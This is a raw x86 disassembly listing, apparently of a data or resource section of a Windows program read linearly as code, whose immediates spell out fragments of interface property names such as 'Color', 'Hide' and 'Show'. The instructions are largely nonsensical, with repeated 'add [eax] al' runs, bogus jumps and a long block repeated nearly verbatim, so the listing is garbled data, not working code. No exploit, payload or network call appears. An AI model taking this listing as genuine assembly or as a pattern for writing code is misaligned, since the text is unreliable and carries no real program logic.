add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add al ah
0x9b14004a 0x4a
xor [ edx ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ ecx + edx * 4 + 0x4a ] dl
add [ eax - 0x73ffb691 ] al
jne r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
test [ esi ] bh
dec ecx
add [ eax ] cl
jge r-xdata
dec ecx
add [ ebp + ebx * 8 + 0x4a ] ah
add ah al
lodsb [ esi ]
dec edx
add ah cl
movsb [ edi ] [ esi ]
dec edx
add ah bh
stosb [ edi ]
dec edx
add [ ebx + ebp * 4 ] dh
dec edx
add al bh
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ eax - 0x3fffb56c ] ch
sub [ ecx ] ecx
mov [ esi + 0x2d98004a ] dl
dec ecx
add [ ebp + ebp + 0x2e500049 ] bh
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd44a685f
jle r-xdata
ror [ edx ] cl
push eax
aam 0x4a
add ah al
aam 0x4a
add al cl
fmul [ edx ]
cmp al 0xd5
dec edx
add [ eax ] ch
stosb [ edi ]
dec edx
add [ eax - 0x56 ] dl
dec edx
add [ edx + ebp * 4 - 0x553bffb6 ] bl
dec edx
add ah ah
ror [ edx ] cl
and al 0xa9
dec edx
add [ ecx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
nop
nop
push 0x7004a20
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
clc
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] al
stosb [ edi ]
dec edx
add [ esp - 0x4323ffb6 ] al
dec edx
add [ eax + 0x4add ] ah
fmul [ edx ]
cmp al 0xdc
dec edx
add [ eax + 0x58004adc ] dh
fisttp [ edx ]
jo r-xdata
pop es
inc ecx
insb
insb
outsd
arpl [ edx + 0x79 ] ax
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
push esi
imul esp [ ebp + 0x77 ] r-xdata
xchg esp eax
push ds
dec edx
add [ ecx ] bh
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ ecx + ebx * 4 + 0x4a ] bl
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add al cl
ror [ eax ] 0x1
add [ eax ] al
add [ eax + 0x3 ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esi + edi + 0x7d080049 ] al
dec ecx
add ah al
mov esi 0xbea8004a
dec edx
add al bl
or cl [ ecx ]
test eax 0xc8ff0001
ja r-xdata
nop
add bh bh
lodsb [ esi ]
iretd
add [ eax + 0x2f ] dh
inc edx
add [ eax + eax ] bh
add dh bh
dec esp
ror [ eax ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
shl [ ecx + 0x48 ] 0x1
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x67696c41
outsb
insb
push esi
inc esp
add al al
add al [ eax ]
[ ebp + 0x4a ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ ecx ] cl
inc edx
jbe r-xdata
sbb [ eax ] eax
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
lodsb [ esi ]
add [ eax ] eax
add [ eax - 0xfffffb ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
jb r-xdata
inc esp
add ah cl
add al [ eax ]
call eax
mov [ 0x1004a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax [ eax ]
or al [ ebx + 0x68 ]
arpl [ gs : ebx + 0x62 ] bp
outsd
js r-xdata
or cl [ edx ]
pushfd
add al [ eax ]
[ eax ]
insb
add [ eax ] al
je r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
jo r-xdata
jae r-xdata
add [ eax ] eax
insb
call 0xffffffffb04a6aa0
add [ eax ] eax
jmp [ edx + ebp * 2 ]
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
sbb al [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
jmp [ eax ]
mov ah 0x46
add [ eax + eax ] ch
inc esp
sbb [ esi + 0x44 ] dl
outsb
jae r-xdata
les edi [ edx + 0x48 ]
jb r-xdata
sbb eax 0x6f430700
insb
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
add [ ebx ] cl
inc ebx
outsd
insb
jne r-xdata
push esi
inc esp
add [ edx + 0x70ff0002 ] cl
movsb [ edi ] [ esi ]
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
hlt
imul ebp [ esi + 0x74 ] 0x44561873
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050020 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
int3
add [ eax ] cl
inc esp
jb r-xdata
jne r-xdata
inc edx
outsb
inc ebx
jb r-xdata
add [ edx + eax ] dl
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
inc esi
insb
popad
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
jb r-xdata
cwde
jno r-xdata
and [ esi ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
add al ah
add eax [ eax ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
add [ esi ] cl
push esi
inc esp
add ch cl
add al [ eax ]
push [ esp ]
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
or eax 0x65646948
sbb [ esi + 0x44 ] dl
add dh cl
add al [ eax ]
dec [ eax - 0x5c ]
dec edx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
and al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
dec eax
imul esp [ ebp + 0x53 ] 0x63656c65
je r-xdata
sbb [ bp + 0x44 ] dl
add bh cl
add al [ eax ]
call [ eax + 0x1004aa3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ edi + 0x72 ] eax
imul esp [ esp + ecx * 2 + 0x69 ] 0x2c73656e
or [ edx ] cl
loopne r-xdata
jmp [ eax + 0x48 ]
jae r-xdata
dec eax
outsd
jbe r-xdata
outsb
sbb [ esi + 0x44 ] dl
add al dl
add al [ eax ]
jmp [ ebx + 0x1004a ]
outsd
retn 0x4a
add bh bh
cmp dl al
dec edx
add [ eax - 0x66 ] al
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4706002a ] al
jb r-xdata
add bh bh
loopne r-xdata
jb r-xdata
or ecx [ ecx + 0x72 ]
dec ecx
jb r-xdata
arpl [ ebx + 0x53 ] bp
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
outsd
outsb
je r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040026 ] al
add [ eax ] 0x0
add [ eax + 0x440e0021 ] al
outsd
jne r-xdata
jpe r-xdata
add [ ebx ] cl
dec ebp
jne r-xdata
push esi
inc esp
add [ eax + 0x8ff0002 ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0b0031 ] al
popad
jb r-xdata
imul ebp [ ebp + 0x65 ] r-xdata
xchg esp eax
add al [ eax ]
push esp
test al 0x4a
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490b002f ] al
arpl [ edi + 0x6e ] bp
dec edi
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
insb
jae r-xdata
je r-xdata
jae r-xdata
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
jb r-xdata
je r-xdata
inc edi
push ebx
insb
arpl [ gs : eax + ebx + 0x56 ] si
inc esp
add [ edx + eax - 0x5c1f0100 ] ah
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
add [ eax ] al
xor al 0x0
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
insd
popad
jae r-xdata
dec ecx
movsb [ edi ] [ esi ]
add al [ eax ]
jmp eax
imul ebp [ edi + 0x6e ] 0x4a0bfc73
add [ edx + eax - 0x3de30100 ] cl
dec edx
add [ eax - 0x26 ] ch
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050030 ] al
je r-xdata
add [ eax + 0x2 ] dh
add bh bh
xchg esp eax
retn
push esi
inc esp
add [ ecx + ebx * 8 + 0x4a ] ah
add al ch
fmul [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ cs : ecx ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ 0x65646948 ] cl
push esi
inc esp
add [ eax - 0x3300fffe ] bl
test al 0x4a
or [ edx + 0x6f ] edx
jne r-xdata
outsd
popad
je r-xdata
add [ eax ] al
add [ esi ] dh
jb r-xdata
add [ ebx ] dh
add [ ecx ] cl
dec edi
ja r-xdata
insd
jae r-xdata
jb r-xdata
insb
arpl [ gs : eax + ebx + 0x56 ] si
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
ja r-xdata
dec eax
popad
jb r-xdata
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ esi + 0x44 ] dl
add [ ebp + 0xcff0002 ] ah
movsb [ edi ] [ esi ]
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
jne r-xdata
add [ eax ] al
add [ eax ] al
aaa
add [ eax ] cl
push edx
popad
dec edi
ja r-xdata
add [ ss : ecx ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax + edx * 2 ] dl
popad
jb r-xdata
push esi
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax [ eax ]
adc al 0x50
add bh bh
pushfd
loopne r-xdata
outsb
je r-xdata
outsb
insb
jns r-xdata
insd
popad
jae r-xdata
add [ eax ] al
cmp [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] eax
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ edx ] bl
add bh bh
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
push esi
imul esp [ ebp + 0x77 ] r-xdata
outsb
add al [ eax ]
jmp eax
add [ ecx ] cl
push edx
outsd
push esi
inc esp
add dl dl
add al [ eax ]
jmp [ eax ]
add [ eax ] 0x0
add [ eax ] al
xor al [ eax ]
or ecx [ ebp + 0x75 ]
insb
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebx ] bh
add [ ecx ] cl
push esi
inc esp
add ah ah
add eax [ eax ]
jmp [ ecx + ebx * 8 ]
dec eax
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
jo r-xdata
cmp eax 0x61500e00
add [ eax + 0x1 ] al
outsd
jne r-xdata
add [ eax + 0x1 ] al
outsb
add [ ecx ] al
outsb
je r-xdata
cmp al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
outsd
insb
outsd
push 0x6f43776f
ja r-xdata
outsb
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
or edx [ ebx + 0x6d ]
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
outsb
dec eax
popad
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jb r-xdata
inc ecx
jb r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add bh bh
add dl 0x4a
outsd
jb r-xdata
add [ ecx ] dl
push ebx
aas
push esi
inc esp
add [ ebx - 0x1f00fffe ] cl
movsb [ edi ] [ esi ]
add [ eax ] 0x0
jb r-xdata
cli
dec ecx
add [ ecx - 0x7f00fffe ] cl
retn 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc eax
add [ 0x776f6853 ] cl
push edi
sbb [ esi + 0x44 ] dl
add ah dh
add al [ eax ]
dec [ eax + 0x1004ad7 ]
jb r-xdata
add [ esi ] cl
push eax
popad
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
add al [ eax ]
push esp
jns r-xdata
or [ ebx + 0x6f ] dl
popad
jae r-xdata
insb
jne r-xdata
pop ds
inc esi
add [ eax + eax ] bh
add [ eax + 0x5009003e ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
loopne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insd
movsb [ edi ] gs : [ esi ]
add [ eax ] cl
push ebx
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
je r-xdata
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ eax ] cl
push ebx
outsd
dec edx
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080041 ] al
sub_4a21d1
xchg esp eax
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080018 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
inc edx
inc edi
add [ edx + eax ] ch
[ esp + 0x4a ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
or eax [ edx + 0x6f ]
jb r-xdata
sbb eax 0x6f430700
insb
jne r-xdata
jb r-xdata
add [ eax - 0xfffffb ] al
sbb al 0x0
add eax 0x6f6c6f43
jb r-xdata
jb r-xdata
inc esp
sbb [ esi + 0x44 ] dl
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
int3
inc esp
add ah cl
add al [ eax ]
call eax
mov [ 0x1004a ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax [ eax ]
or al [ ebx + 0x68 ]
arpl [ gs : ebx + 0x62 ] bp
outsd
js r-xdata
or cl [ edx ]
pushfd
add al [ eax ]
[ eax ]
insb
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
add [ ebx ] cl
inc ebx
outsd
insb
jne r-xdata
push esi
inc esp
add [ edx + 0x70ff0002 ] cl
movsb [ edi ] [ esi ]
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
insb
imul esp [ ebx + 0x6b ] r-xdata
jo r-xdata
jae r-xdata
add [ eax ] eax
insb
call 0xffffffffb04a6aa0
add [ eax ] eax
jmp [ edx + ebp * 2 ]
add [ eax ] cl
inc esp
jb r-xdata
jne r-xdata
inc edx
outsb
inc ebx
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
sbb al [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
jmp [ eax ]
mov ah 0x46
add [ eax + eax ] ch
inc esi
insb
popad
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
jb r-xdata
cwde
jno r-xdata
les edi [ edx + 0x48 ]
jb r-xdata
add al ah
add eax [ eax ]
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
hlt
imul ebp [ esi + 0x74 ] 0x44561873
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050020 ] al
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
or eax 0x65646948
sbb [ esi + 0x44 ] dl
add dh cl
add al [ eax ]
dec [ eax - 0x5c ]
dec edx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
and al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jb r-xdata
add [ edx + eax ] dl
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
xor eax [ eax + ebx + 0x56 ]
inc esp
dec eax
imul esp [ ebp + 0x53 ] 0x63656c65
je r-xdata
sbb [ bp + 0x44 ] dl
add bh cl
add al [ eax ]
call [ eax + 0x1004aa3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ edi + 0x72 ] eax
imul esp [ esp + ecx * 2 + 0x69 ] 0x2c73656e
or [ edx ] cl
loopne r-xdata
jmp [ eax + 0x48 ]
jae r-xdata
and [ esi ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
dec eax
outsd
jbe r-xdata
outsb
sbb [ esi + 0x44 ] dl
add al dl
add al [ eax ]
jmp [ ebx + 0x1004a ]
outsd
retn 0x4a
add bh bh
cmp dl al
dec edx
add [ eax - 0x66 ] al
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4706002a ] al
jb r-xdata
add bh bh
loopne r-xdata
jb r-xdata
add [ esi ] cl
push esi
inc esp
add ch cl
add al [ eax ]
push [ esp ]
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
or ecx [ ecx + 0x72 ]
dec ecx
jb r-xdata
arpl [ ebx + 0x53 ] bp
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
or [ esi + 0x75 ] al
insb
insb
inc esp
jb r-xdata
outsd
outsb
je r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040026 ] al
add [ eax ] 0x0
add [ eax + 0x440e0021 ] al
outsd
jne r-xdata
jpe r-xdata
add [ ebx ] cl
dec ebp
jne r-xdata
push esi
inc esp
add [ eax + 0x8ff0002 ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c0b0031 ] al
popad
jb r-xdata
imul ebp [ ebp + 0x65 ] r-xdata
xchg esp eax
add al [ eax ]
push esp
test al 0x4a
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490b002f ] al
arpl [ edi + 0x6e ] bp
dec edi
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
insb
jae r-xdata
je r-xdata
jae r-xdata
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
jb r-xdata
je r-xdata
inc edi
push ebx
insb
arpl [ gs : eax + ebx + 0x56 ] si
inc esp
add [ edx + eax - 0x5c1f0100 ] ah
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
add [ eax ] al
xor al 0x0
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
insd
popad
jae r-xdata
dec ecx
movsb [ edi ] [ esi ]
add al [ eax ]
jmp eax
imul ebp [ edi + 0x6e ] 0x4a0bfc73
add [ edx + eax - 0x3de30100 ] cl
dec edx
add [ eax - 0x26 ] ch
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050030 ] al
je r-xdata
add [ eax + 0x2 ] dh
add bh bh
xchg esp eax
retn
push esi
inc esp
add [ ecx + ebx * 8 + 0x4a ] ah
add al ch
fmul [ edx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add [ cs : ecx ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ 0x65646948 ] cl
push esi
inc esp
add [ eax - 0x3300fffe ] bl
test al 0x4a
or [ edx + 0x6f ] edx
jne r-xdata
outsd
popad
je r-xdata
add [ eax ] al
add [ esi ] dh
jb r-xdata
add [ ebx ] dh
add [ ecx ] cl
dec edi
ja r-xdata
insd
jae r-xdata
jb r-xdata
insb
arpl [ gs : eax + ebx + 0x56 ] si
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
ja r-xdata
dec eax
popad
jb r-xdata
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ esi + 0x44 ] dl
add [ ebp + 0xcff0002 ] ah
movsb [ edi ] [ esi ]
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
jne r-xdata
add [ eax ] al
add [ eax ] al
aaa
add [ eax ] cl
push edx
popad
dec edi
ja r-xdata
add [ ss : ecx ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax + edx * 2 ] dl
popad
jb r-xdata
push esi
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
cmp eax [ eax ]
adc al 0x50
add bh bh
pushfd
loopne r-xdata
outsb
je r-xdata
outsb
insb
jns r-xdata
insd
popad
jae r-xdata
add [ eax ] al
cmp [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ eax ] eax
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ edx ] bl
add bh bh
je r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
push esi
imul esp [ ebp + 0x77 ] r-xdata
outsb
add al [ eax ]
jmp eax
add [ ecx ] cl
push edx
outsd
push esi
inc esp
add dl dl
add al [ eax ]
jmp [ eax ]
add [ eax ] 0x0
add [ eax ] al
xor al [ eax ]
or ecx [ ebp + 0x75 ]
insb
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebx ] bh
add [ ecx ] cl
push esi
inc esp
add ah ah
add eax [ eax ]
jmp [ ecx + ebx * 8 ]
dec eax
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
jo r-xdata
cmp eax 0x61500e00
add [ eax + 0x1 ] al
outsd
jne r-xdata
add [ eax + 0x1 ] al
outsb
add [ ecx ] al
outsb
je r-xdata
cmp al 0x0
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
outsd
insb
outsd
push 0x6f43776f
ja r-xdata
outsb
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
or edx [ ebx + 0x6d ]
popad
insb
insb
dec ecx
insd
popad
jae r-xdata
outsb
dec eax
popad
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
jb r-xdata
inc ecx
jb r-xdata
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add bh bh
add dl 0x4a
outsd
jb r-xdata
add [ ecx ] dl
push ebx
aas
push esi
inc esp
add [ ebx - 0x1f00fffe ] cl
movsb [ edi ] [ esi ]
add [ eax ] 0x0
jb r-xdata
cli
dec ecx
add [ ecx - 0x7f00fffe ] cl
retn 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc eax
add [ 0x776f6853 ] cl
push edi
sbb [ esi + 0x44 ] dl
add ah dh
add al [ eax ]
dec [ eax + 0x1004ad7 ]
jb r-xdata
add [ esi ] cl
push eax
popad
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
add al [ eax ]
push esp
jns r-xdata
or [ ebx + 0x6f ] dl
popad
jae r-xdata
insb
jne r-xdata
pop ds
inc esi
add [ eax + eax ] bh
add [ eax + 0x5009003e ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
loopne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insd
movsb [ edi ] gs : [ esi ]
add [ eax ] cl
push ebx
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
je r-xdata
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
add [ eax ] cl
push ebx
outsd
dec edx
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080041 ] al
sub_4a25e9
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
